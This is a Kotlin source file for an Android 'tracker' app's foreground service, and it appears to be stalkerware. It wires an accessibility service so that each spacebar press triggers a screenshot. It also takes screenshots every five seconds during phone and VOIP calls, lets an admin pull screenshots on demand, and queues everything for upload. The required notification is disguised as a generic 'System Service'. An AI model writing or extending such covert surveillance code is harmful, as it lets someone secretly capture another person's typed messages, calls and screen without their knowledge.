package com.tracker.app.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat

/**
 * Foreground service required by Android to keep background services alive.
 * Shows a minimal persistent notification (required by Android OS).
 * 
 * This service coordinates:
 * - SpacebarAccessibilityService (spacebar → screenshot)
 * - CallMonitorService (call detection → 5sec screenshots)
 * - ScreenshotService (actual screen capture)
 */
class MonitoringForegroundService : Service() {

    companion object {
        private const val TAG = "MonitorForeground"
        private const val CHANNEL_ID = "monitoring_channel"
        private const val NOTIFICATION_ID = 1001
        var instance: MonitoringForegroundService? = null
    }

    private lateinit var screenshotService: ScreenshotService

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
        screenshotService = ScreenshotService(applicationContext)

        // Start as foreground service
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)

        // Wire up spacebar detection
        setupSpacebarListener()

        // Wire up call monitoring
        setupCallListener()

        Log.d(TAG, "Monitoring foreground service started")
    }

    /**
     * When spacebar is detected by AccessibilityService,
     * capture a screenshot and queue it for upload.
     */
    private fun setupSpacebarListener() {
        SpacebarAccessibilityService.onSpacebarPressed = {
            Log.d(TAG, "Spacebar trigger received")
            Thread {
                val file = screenshotService.captureScreenshot()
                if (file != null) {
                    Log.d(TAG, "Spacebar screenshot captured: ${file.absolutePath}")
                    // Upload via platform channel callback to Flutter
                    UploadQueue.addSpacebarScreenshot(file)
                }
            }.start()
        }
    }

    /**
     * When a call starts (cellular or VOIP), begin 5-second interval screenshots.
     * When the call ends, stop and queue for batch upload.
     */
    private fun setupCallListener() {
        CallMonitorService.onCallStarted = { source ->
            Log.d(TAG, "Call started from: $source - beginning screenshot capture")
            Thread {
                screenshotService.startCallScreenshots(source)
            }.start()
        }

        CallMonitorService.onCallEnded = { source ->
            Log.d(TAG, "Call ended from: $source - stopping capture and queuing upload")
            Thread {
                val result = screenshotService.stopCallScreenshots()
                if (result.files.isNotEmpty()) {
                    UploadQueue.addCallScreenshots(result, source)
                }
            }.start()
        }
    }

    /**
     * Capture a screenshot for admin realtime pull.
     */
    fun captureForRealtimePull(): java.io.File? {
        return screenshotService.captureScreenshot()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background monitoring service"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        instance = null
        screenshotService.destroy()
        super.onDestroy()
    }
}
